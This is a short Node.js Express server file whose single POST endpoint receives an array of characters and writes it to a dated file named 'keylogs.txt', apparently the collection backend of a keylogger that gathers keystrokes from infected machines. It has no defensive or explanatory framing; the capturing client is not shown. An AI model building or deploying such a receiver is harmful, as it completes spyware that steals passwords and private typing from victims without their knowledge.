const express = require("express");
const fs = require("fs");
const moment = require("moment");
require('dotenv').config();
const app = express();
app.use(express.json());

app.post("/api/post", (req, res) => {
  try {
    const { data } = req.body;

    let text = "";

    for (let i = 0; i < data.length; i++) {
      text += data[i];
    }

    // create or rewrite logs file via today's date YEAR-MONTH-DAY format
    fs.writeFile(
      moment().format("YYYY-MM-DD") + "-" + "keylogs.txt",
      text,
      function (err) {
        if (err) {
          throw err;
        }
      }
    );

    return res.json({
      success: true,
      message: "file has been logged",
    });
  } catch (err) {
    console.log("ERROR:", err.message);
    return res.json({
      success: false,
      message: err.message,
    });
  }
});

app.listen(process.env.PORT, console.log(`listening on port ${process.env.PORT}`));
